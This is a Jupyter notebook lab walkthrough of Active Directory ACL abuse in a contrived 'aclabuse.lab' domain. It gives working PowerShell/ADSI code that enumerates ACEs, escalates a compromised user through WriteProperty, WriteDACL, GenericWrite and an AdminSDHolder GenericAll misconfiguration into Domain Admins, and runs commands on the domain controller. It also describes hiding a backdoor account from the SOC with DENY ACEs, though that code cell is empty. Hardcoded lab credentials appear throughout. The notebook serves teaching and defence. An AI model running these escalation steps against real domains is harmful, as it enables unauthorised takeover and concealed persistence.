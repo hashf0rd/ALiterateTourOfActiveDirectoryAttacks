{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "vscode": {
     "languageId": "powershell"
    }
   },
   "source": [
    "# ACL Overview\n",
    "In the Windows operating system, everything is an object - that is, everything is represented by data structures in memory, that contain members that describe the nature of the data the structure is meant to represent. Obvious things such as files and registry keys are objects, but also more abstract things such as processes and threads are also objects.\n",
    "\n",
    "Active Directory is no different - AD is primarily a database of objects that represent the various identities and relationships in a Windows network. Each object in an AD environment is a user, a group, a computer, a printer, a service account, or even a container for any of these.\n",
    "\n",
    "Again, as in the Windows operating system, Active Directory objects themselves control who has access to them via _Access Control Lists_, or ACLs (specifically the **D**iscretionary **A**ccess **C**ontrol List or DACL), with each Access Control Entry (or ACE) in the ACL specifying an identity and the specific access rights that identity can excise on the object.\n",
    "\n",
    "Access rights are incredibly powerful - the demonstration below is not exhaustive, but it will be become apparent how destructive a misconfiured ACE on the wrong object can be. Notably however, many of the attacks that are enabled by misconfigured access rights are detailed in their own notebooks, making understanding what objects have rights over other objects one of the fundamental tasks in reconaissance, and in understanding numerous other attack paths through an AD environment.  \n",
    "\n",
    "This lab however will focus on an attack path that relies entirely on misconfigured ACLs. While this is a contrived example, it will demonstrate how these attacks paths work, and lay important foundations for other labs. If you skip any lab, do not skip this one.\n",
    "\n",
    "For this lab, we will assume we have access to the account of a user called \"John Dee\" by some initial access technique."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "function Search-Directory {\n",
    "    param (\n",
    "        [String]$filter,\n",
    "        [Switch]$all\n",
    "    )\n",
    "\n",
    "    # we are hardcoding a lot of stuff here including creds, which is... bad\n",
    "    $dirEntry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://dc01.aclabuse.lab\", \"aclabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "    $searcher = New-Object System.DirectoryServices.DirectorySearcher($dirEntry)\n",
    "    $searcher.Filter = $filter\n",
    "\n",
    "    # SACL part of security descriptor can only be read by a domain admin, so explicitly request the DACL only\n",
    "    $searcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl\n",
    "\n",
    "    try {\n",
    "        if($all) {\n",
    "            $results = $searcher.FindAll()\n",
    "            $results | Foreach-Object { $_ }\n",
    "            $results.Dispose()\n",
    "        } else {\n",
    "            $searcher.FindOne()\n",
    "        }\n",
    "    } finally {\n",
    "        $dirEntry.Dispose()\n",
    "    }\n",
    "}\n",
    "\n",
    "Search-Directory -Filter \"(ObjectCategory=*)\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Looks like the creds work. The above .NET type `DirectoryEntry` retrieves an entry in the AD directory as the name suggests. We are using the [ADSI interface](https://learn.microsoft.com/en-us/windows/win32/adsi/using-adsi) for these calls. The `DirectoryEntry` object for the domain is [being constructed](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry.-ctor?view=net-8.0#system-directoryservices-directoryentry-ctor(system-string-system-string-system-string-system-directoryservices-authenticationtypes)) using the path to the _RootDSE_, which is the Root object of the entire Directory. The RootDSE sits on a directory server, so we supply it wih the FQDN of the domain controller (the directory server for this lab).\n",
    "\n",
    "We then construct a `DirectorySearcher` object - think of it as a pointer or cursor which we use to traverse the directory and look for objects.\n",
    "\n",
    "Lets examine the account we have creds for in more detail, by setting the _filter_ on the searcher. This uses LDAP filter syntax, which is somewhat idiosyncratic. As you can see below, looks like John is in the group __Office Admins__. Maybe an HR function of some kind? "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$userSearchResult = Search-Directory -Filter \"(&(objectCategory=user)(samAccountName=john.dee))\"\n",
    "\n",
    "\"DN: $($userSearchResult.Properties.distinguishedname)\"\n",
    "\"Groups:\"\n",
    "foreach ($group in $($userSearchResult.Properties.memberof)) {\n",
    "    \"    $group\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets examine the properties of the Office Admins group briefly. We set the filter to look for the Office Admins group, retrieve a `SearchResult` object and print the properties of the object, which will have been filled with the properties of the AD object we searched for."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$officeAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=Office Admins))\"\n",
    "\n",
    "\"CN: $($officeAdminsSearchResult.Properties.cn)\"\n",
    "\"DN: $($officeAdminsSearchResult.Properties.distinguishedname)\"\n",
    "\"Members: $($officeAdminsSearchResult.Properties.member)\"\n",
    "\"SID: $($officeAdminsSearchResult.Properties.objectsid)\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can see the members only include John (this is a contrived lab after all). Notice that the SID of the group is in a binary format however. We need the SID for the next step, so we will construct a `SecurityIdentifier` object out of this binary value, in order to convert it to the more recognisable form."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$officeAdminsSID = (New-Object System.Security.Principal.SecurityIdentifier([Byte[]]$officeAdminsSearchResult.Properties.objectsid[0],0))\n",
    "$officeAdminsSID.Value"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now for some actual recon. Lets look at what other groups the Office Admins group has rights on. As before we set the LDAP filter, this time to look for any groups with _admin_ in the name. Then, we iterate through the groups, examining the ACLs for the group as we go and highlighting any ACEs that contain the SID of the Office Admins group. This will give us a list of objects in the domain that members of the Office Admins group have permissions over. \n",
    "\n",
    "We will do this multiple times in the lab, so we will wrap this large chunk of code into a convenience function. If we wanted to scale this or use it outside this lab we would need to refactor it considerably, but it works well enough for this demonstration."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "function scout-adminACL {\n",
    "    param (\n",
    "        [String]$targetSID\n",
    "    )\n",
    "\n",
    "    Write-Host \"Checking which admin groups $targetSID has rights on...\"\n",
    "    $groups = $(Search-Directory -Filter \"(&(objectCategory=group)(cn=*admin*))\" -All) \n",
    "    foreach ($group in $groups) {\n",
    "        \n",
    "        # Get the common name of the group\n",
    "        $groupName = $group.Properties[\"cn\"][0]\n",
    "\n",
    "        # Get the ACL from the binary nTSecurityDescriptor property\n",
    "        $groupSecurityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity\n",
    "        $groupSecurityDescriptor.SetSecurityDescriptorBinaryForm([Byte[]]$group.Properties[\"nTSecurityDescriptor\"][0])\n",
    "        $groupACL = $groupSecurityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])\n",
    "        \n",
    "        foreach ($ace in $groupACL) {\n",
    "            if ($ace.IdentityReference.CompareTo($targetSID) -eq 0) {\n",
    "                Write-Host \"$($ace.AccessControlType) -> $($ace.ActiveDirectoryRights) on '$groupName'\"\n",
    "            }\n",
    "        }\n",
    "    }\n",
    "}\n",
    "\n",
    "scout-adminACL -targetSID $officeAdminsSID.Value\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Bingo. But what can we do with this right?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## WriteProperty\n",
    "This right, as the name implies, grants a principal the capability to modify properties on another object. If we had `WriteProperty` on the _Domain Admins_ group, we could simply modify the _members_ property and add ourselves to that group, for example. Not so lucky this time, but we do have this right over the _DevOps Admins_ group. We will use this to add our compromised user to the _DevOps Admins_ group.\n",
    "\n",
    "Using the searcher we find the group object and call the `GetDirectoryEntry` method to retrieve the Directory entry itself - we will need this to actually make changes to the object as it exists in the directory."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$devOpsAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=DevOps Admins))\"\n",
    "\"Group Name: $($devopsAdminsSearchResult.Properties.name)\"\n",
    "\"Original Members:\"\n",
    "foreach ($member in $($devopsAdminsSearchResult.Properties.member)){\n",
    "    \"    $member\"\n",
    "}\n",
    "\n",
    "try {\n",
    "    $path = $devopsAdminsSearchResult.Path\n",
    "    $devOpsAdminsEntry = New-Object System.DirectoryServices.DirectoryEntry($path, \"aclabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "    $devopsAdminsEntry.Add(\"LDAP://CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\")\n",
    "    $devopsAdminsEntry.RefreshCache()\n",
    "} finally {\n",
    "    $devopsAdminsEntry.Dispose()\n",
    "}\n",
    "\n",
    "$devOpsAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=DevOps Admins))\"\n",
    "\"`nNew Members:\"\n",
    "foreach ($member in $($devopsAdminsSearchResult.Properties.member)) {\n",
    "    \"    $member\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "By turning the searcher back to the compromised account we can see the `MemberOf` property has been updated and reflects the new group membership."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$userSearchResult = Search-Directory -Filter \"(&(objectClass=user)(samAccountName=john.dee))\"\n",
    "\n",
    "\"DN: $($userSearchResult.Properties.distinguishedname)\"\n",
    "\"Groups:\"\n",
    "foreach ($group in $($userSearchResult.Properties.memberof)) {\n",
    "    \"    $group\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## WriteDACL\n",
    "WriteDACL is self descriptive - it allows for a principal to modify the DACL of an object."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$devopsAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=DevOps Admins))\"\n",
    "$devopsAdminsSID = (New-Object System.Security.Principal.SecurityIdentifier([Byte[]]$devopsAdminsSearchResult.Properties.objectsid[0],0))\n",
    "scout-adminACL -targetSID $devopsAdminsSID.value"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets use the WriteDACL write to add an entry to the ACL on the IT Admins group object which lets us modify the group. We could add WriteProperty and use this as before to modify group membership, but lets try a more permissive right: GenericWrite.\n",
    "\n",
    "We will first construct an ACE using our compromised users SID, the AD right we want (GenericWrite), the control type of allow, and with inheritence disabled. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$userSID = (New-Object System.Security.Principal.SecurityIdentifier([Byte[]]$userSearchResult.Properties.objectsid[0],0))\n",
    "$newAce = (New-Object System.DirectoryServices.ActiveDirectoryAccessRule(\n",
    "                ([System.Security.Principal.IdentityReference]([System.Security.Principal.SecurityIdentifier]$userSID)), \n",
    "                ([System.DirectoryServices.ActiveDirectoryRights]'GenericWrite'),\n",
    "                ([System.Security.AccessControl.AccessControlType]'Allow'),\n",
    "                ([System.DirectoryServices.ActiveDirectorySecurityInheritance]'None'))\n",
    "            )\n",
    "$newAce | Select *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$ITAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=IT Admins))\"\n",
    "\n",
    "try {\n",
    "    $path = \"LDAP://dc01.aclabuse.lab/$($ITAdminsSearchResult.Properties.distinguishedname)\"\n",
    "    $ITAdminsEntry = New-Object System.DirectoryServices.DirectoryEntry($path, \"aclabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "    $ITAdminsEntry.psbase.Options.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl\n",
    "    $ITAdminsEntry.psbase.ObjectSecurity.AddAccessRule($newAce)\n",
    "    $ITAdminsEntry.psbase.CommitChanges()\n",
    "} finally {\n",
    "    $ITAdminsEntry.Dispose()\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## GenericWrite"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "source": [
    "Now using GenericWrite we can add our compromised user to the IT Admins group."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$ITAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=IT Admins))\"\n",
    "\"Group Name: $($ITAdminsSearchResult.Properties.name)\"\n",
    "\"Original Members:\"\n",
    "foreach ($member in $($ITAdminsSearchResult.Properties.member)){\n",
    "    \"    $member\"\n",
    "}\n",
    "\n",
    "try {\n",
    "    $path = $ITAdminsSearchResult.Path\n",
    "    $ITAdminsEntry = New-Object System.DirectoryServices.DirectoryEntry($path, \"aclabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "    $ITAdminsEntry.Add(\"LDAP://CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\")\n",
    "    $ITAdminsEntry.RefreshCache()\n",
    "} finally {\n",
    "    $ITAdminsEntry.Dispose()\n",
    "}\n",
    "\n",
    "$ITAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=IT Admins))\"\n",
    "\"Current Members:\"\n",
    "foreach ($member in $($ITAdminsSearchResult.Properties.member)){\n",
    "    \"    $member\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "And as before this should be reflected in the users directory entry."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$userSearchResult = Search-Directory -Filter \"(&(objectClass=user)(samAccountName=john.dee))\"\n",
    "\n",
    "\"DN: $($userSearchResult.Properties.distinguishedname)\"\n",
    "\"Groups:\"\n",
    "foreach ($group in $($userSearchResult.Properties.memberof)) {\n",
    "    \"    $group\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets examine what rights the IT Admins group has and on what objects in the domain."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$ITAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(objectClass=group)(cn=IT Admins))\"\n",
    "$ITAdminsSID = (New-Object System.Security.Principal.SecurityIdentifier([Byte[]]$ITAdminsSearchResult.Properties.objectsid[0],0))\n",
    "scout-adminACL -targetSID $ITAdminsSID.value"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Blimey. Thats bad. Looks like IT Admins has permissions on all privileged groups. So what is granting these rights?\n",
    "\n",
    "## GenericAll and AdminSDHolder\n",
    "GenericAll means just that - any and all actions are permitted on the target object for the principle granted the right. How this right was applied to so many privileged groups is down to a template object known as AdminSDHolder.\n",
    "\n",
    "AdminSDHolder is an object that holds the DACL for all privileged objects in the domain. Every 60 minutes or so, a process called SDProp will run and apply whatever DACL is on AdminSDHolder to the privileged groups, overwriting any other DACL that those objects may have. This is a security control, as any misconfigurations to the DACL of these privileged groups could lead to compromise as we have already seen. This is unfortunately a double edged sword, and if permissions on the AdminSDHolder object are not careful controlled then it instead becomes a pathway for an attacker.\n",
    "\n",
    "As we can see below the IT Admins group was at some point granted GenericAll on the AdminSDHolder object, likely for troubleshooting, and has retained this right, meaning it has propagated out to all the privileged groups in the domain."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$AdminSDPath = (Search-Directory -Filter  \"(cn=AdminSDHolder)\").Path\n",
    "\n",
    "try {\n",
    "    $adminSDEntry = New-Object System.DirectoryServices.DirectoryEntry(\n",
    "                        $AdminSDPath, \n",
    "                        \"aclabuse.lab\\john.dee\", \n",
    "                        \"johnsPass01\"\n",
    "                    )\n",
    "\n",
    "    ForEach ($ACE in $adminSDEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {\n",
    "        if ($ACE.IdentityReference.CompareTo($ITAdminsSID) -eq 0) {\n",
    "            $ACE\n",
    "        }\n",
    "    }\n",
    "} finally {\n",
    "    $adminSDEntry.Dispose()\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "GenericAll gives us free reign over the objects it is applied to, so its a simple matter now of adding our compromised account to the domain admins group and establishing domain dominance."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$domainAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=Domain Admins))\"\n",
    "\"Group Name: $($domainAdminsSearchResult.Properties.name)\"\n",
    "\"Original Members:\"\n",
    "foreach ($member in $($domainAdminsSearchResult.Properties.member)){\n",
    "    \"    $member\"\n",
    "}\n",
    "\n",
    "try {\n",
    "    $path = $domainAdminsSearchResult.Path\n",
    "    $domainAdminsEntry = New-Object System.DirectoryServices.DirectoryEntry($path, \"aclabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "    $domainAdminsEntry.Add(\"LDAP://CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\")\n",
    "    $domainAdminsEntry.RefreshCache()\n",
    "} finally {\n",
    "    $domainAdminsEntry.Dispose()\n",
    "\n",
    "\n",
    "$domainAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=Domain Admins))\"\n",
    "\"`nCurrent Members:\"\n",
    "foreach ($member in $($domainAdminsSearchResult.Properties.member)){\n",
    "    \"    $member\"\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$credential = New-Object PSCredential(\"aclabuse\\john.dee\", $(ConvertTo-SecureString \"johnsPass01\" -AsPlainText -Force))\n",
    "Invoke-Command -ComputerName \"dc01.aclabuse.lab\" -Credential $credential -ScriptBlock {\n",
    "   whoami.exe /all\n",
    " }\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Persistence\n",
    "Now a member of the Domain Admins group, the attacker creates a backdoor account and sets several DENY ACEs on the account in order to blind the SOC to its existence.\n",
    "\n",
    "First the attacker creates a container for the account, and explicitly denys the SOC group the RIGHT_DS_LIST_CONTENTS right on it.\n",
    "\n",
    "Then the attacker creates a highly priviled account named backdoor, and denies the SOC group the RIGHT_DS_LIST_OBJECT right on it.\n",
    "\n",
    "As you can see, when authenticating as the SOC user Jane.Doe, the object is not listed."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Last Words\n",
    "Although a lot of manual recon was performed in this notebook, the entire attack path is viewable, in a much more digestible format, via bloodhound:\n",
    "\n",
    "![aclabuse_attack_path](./Images/aclabuse.png) \n",
    "\n",
    "Interestingly, in its earlier versions bloodhound internally used the ADSI pattern used in this notebook; [it has since switched to a different method](https://blog.cptjesus.com/posts/sharphoundtechnical/#pure-ldap). \n",
    "\n",
    "# Further Reading\n",
    "[An Ace Up the Sleeve: Designing Active Directory DACL Backdoors](https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf)\n",
    "\n",
    "https://learn.microsoft.com/en-us/windows/win32/ad/security-contexts-and-active-directory-domain-services"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "name": "csharp"
  },
  "polyglot_notebook": {
   "kernelInfo": {
    "defaultKernelName": "csharp",
    "items": [
     {
      "aliases": [],
      "name": "csharp"
     }
    ]
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
